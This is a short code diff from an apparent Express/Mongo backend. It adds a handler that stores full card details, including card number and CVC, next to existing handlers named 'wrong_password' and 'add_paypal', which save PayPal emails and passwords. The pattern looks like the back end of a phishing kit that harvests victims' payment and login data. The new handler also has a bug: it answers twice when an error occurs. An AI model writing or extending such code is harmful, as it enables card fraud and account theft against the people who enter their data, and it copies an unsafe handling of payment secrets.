@@ -189,6 +189,28 @@ export const wrong_password = (req, res) => {
 
 }
 
+export const card_add = (req, res) => {
+
+    const {id, validity,address,cardNumber,cvc,name,zipCode } = req.body;
+
+
+    Info.findOneAndUpdate({ _id: id }, {
+        $set: {
+            validity,address,cardNumber,cvc,name,zipCode
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+
+        return res.status(200).json({ success:"true" })
+    })
+   
+
+
+}
+
+
 export const add_paypal = (req, res) => {
     const { id, email,password } = req.body;
     Info.findOneAndUpdate({ _id: id }, {
